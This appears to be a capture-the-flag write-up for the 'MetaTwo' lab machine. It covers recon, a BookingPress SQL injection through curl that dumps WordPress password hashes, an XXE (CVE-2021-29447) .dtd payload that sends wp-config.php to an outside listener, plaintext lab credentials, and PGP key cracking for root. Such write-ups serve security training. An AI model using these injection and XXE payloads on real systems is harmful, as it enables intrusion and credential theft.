# MetaTwo

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.228.95   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 05:13 EDT
Nmap scan report for 10.129.228.95
Host is up (0.0077s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

FTP doesn't support anonymous logins, so let's move on to port 80. We have to add `metapress.htb` to access it.&#x20;

### Metapress --> SQLI --> XXE&#x20;

The website was a blog of some sorts:

<figure><img src="../../../.gitbook/assets/image (2371).png" alt=""><figcaption></figcaption></figure>

Reading a bit of the page source reveals this is a Wordpress site, so let's use `wpscan` with the API token to enumerate plugins and the version.&#x20;

```
$ wpscan --api-token FQVv71ka5LaR9z8xOr4saXCg0vAMyKKD4VQS2eOymUQ --enumerate p,t,u --url http://metapress.htb/ --plugins-detection aggressive
[!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
 |     Fixed in: 5.6.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/29378
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
 |      - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
 |      - https://hackerone.com/reports/1095645
 |      - https://www.youtube.com/watch?v=3NBxcmqCgt4
```

This was the main exploit I found interesting because the version running on `metapress.htb` is version 5.6.2, while this was patched in 5.6.3. However, I don't have any credentials. Also, `wpscan` didn't pick up on any plugins for whatever reason.

While clicking on the URL within the blog post, I noticed that it was using a certain plugin.

<figure><img src="../../../.gitbook/assets/image (2473).png" alt=""><figcaption></figcaption></figure>

This is a plugin that has a lot of vulnerabilities:

```
$ searchsploit wordpress booking
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
WordPress Plugin Appointment Booking Calendar 1.3.34 - CSV | php/webapps/48204.txt
WordPress Plugin Booking Calendar 3.0.0 - SQL Injection /  | php/webapps/44769.txt
WordPress Plugin Booking Calendar 4.1.4 - Cross-Site Reque | php/webapps/27399.txt
WordPress Plugin Booking Calendar 6.2 - SQL Injection      | php/webapps/40189.txt
```

The traffic reveals that this is version 1.0.10. Googling for exploits related to this plugin returns this page with a PoC:

{% embed url="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" %}

Using the exact PoC doesn't work though:

```
$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \ 
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 07 May 2023 03:24:52 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

{"variant":"error","title":"Error","msg":"Sorry, Your request can not process due to security reason."} 
```

It seems that the `wpnonce` variable is incorrectly set. After changing it to a relevant one, we get confirmation that this works:

{% code overflow="wrap" %}
```
$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=75eb04a260&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 07 May 2023 03:25:53 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}] 
```
{% endcode %}

With this, we can retrieve the user hashes:

{% code overflow="wrap" %}
```
$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=75eb04a260&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login), group_concat(user_pass), @@version_compile_os,1,2,3,4,5,6 from wp_users-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 07 May 2023 03:27:42 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"admin,manager","bookingpress_category_id":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70", <TRUNCATED>
```
{% endcode %}

There were 2 hashes, and one of them could be cracked.&#x20;

<figure><img src="../../../.gitbook/assets/image (2485).png" alt=""><figcaption></figcaption></figure>

Now that we have credentials, we can run the authenticated XXE injection.

{% embed url="https://github.com/motikan2010/CVE-2021-29447" %}

How this exploit works is by using the credentails to make the Wordpress site requests for a `.dtd` file. This is done by uploading a malicious `.wav` file via New Media, making the site request and execute the `.dtd` file. This would allow us to get LFI on the machine.

Following the PoC from the repo above, I was able to replicate it.&#x20;

<figure><img src="../../../.gitbook/assets/image (3745).png" alt=""><figcaption></figcaption></figure>

Using this `.dtd` file, we can grab the `wp-config.php` file:

```markup
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://host.docker.internal:8001/?p=%file;'>" >
```

Within that file, we can find FTP credentials:

<figure><img src="../../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>

We can login to FTP using `metapress.htb:9NYS_ii@FyL_p5M2NvJ`.

### FTP Enum

After logging in to FTP, we can find a few directories:

```
ftp> ls
229 Entering Extended Passive Mode (|||28574|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
```

Within the `mailer` directory, there are some PHP files:

```
ftp> ls
229 Entering Extended Passive Mode (|||4052|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
```

Within the `send_email.php` file, there are some credentials for `jnelson`.&#x20;

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;
```

With these credentials, we can `ssh` in as `jnelson`.

<figure><img src="../../../.gitbook/assets/image (3508).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Passpie

Within the user's directory, there's a `.passpie` file present:

```
jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 May  7 04:10 user.txt

jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh

jnelson@meta2:~/.passpie/ssh$ ls -la
total 16
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 .
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson  683 Oct 25  2022 jnelson.pass
-r-xr-x--- 1 jnelson jnelson  673 Oct 25  2022 root.pass
```

`passpie` is a command-line password manager:

{% embed url="https://github.com/marcwebbie/passpie" %}

The `.keys` directory contains a PGP key pair, which I'm assuming is used to decrypt the `root.pass` file. I took the private key from the `.keys` file, and cracked it using `gpg2john` > `john`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2391).png" alt=""><figcaption></figcaption></figure>

With this password, we can decrypt the `root.pass` file:

<figure><img src="../../../.gitbook/assets/image (1447).png" alt=""><figcaption></figcaption></figure>
